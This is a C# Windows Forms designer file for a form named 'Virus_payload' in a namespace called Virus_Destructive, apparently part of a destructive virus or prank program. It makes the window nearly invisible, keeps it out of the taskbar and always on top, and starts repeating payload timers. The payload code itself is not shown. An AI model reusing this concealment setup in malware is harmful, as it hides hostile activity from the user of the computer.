namespace Virus_Destructive
{
    partial class Virus_payload
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Virus_payload));
            this.tmr1 = new System.Windows.Forms.Timer(this.components);
            this.tmr_add = new System.Windows.Forms.Timer(this.components);
            this.tmr_next_payload = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // tmr1
            // 
            this.tmr1.Enabled = true;
            this.tmr1.Interval = 15000;
            this.tmr1.Tick += new System.EventHandler(this.tmr1_Tick);
            // 
            // tmr_add
            // 
            this.tmr_add.Enabled = true;
            this.tmr_add.Interval = 10000;
            this.tmr_add.Tick += new System.EventHandler(this.tmr_add_Tick);
            // 
            // tmr_next_payload
            // 
            this.tmr_next_payload.Enabled = true;
            this.tmr_next_payload.Interval = 20000;
            this.tmr_next_payload.Tick += new System.EventHandler(this.tmr_next_payload_Tick);
            // 
            // Virus_payload
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(10, 10);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Virus_payload";
            this.Opacity = 0.01D;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.Text = "Virus_payload";
            this.TopMost = true;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Virus_payload_FormClosing);
            this.Load += new System.EventHandler(this.Virus_payload_Load);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Timer tmr1;
        private System.Windows.Forms.Timer tmr_add;
        private System.Windows.Forms.Timer tmr_next_payload;
    }
}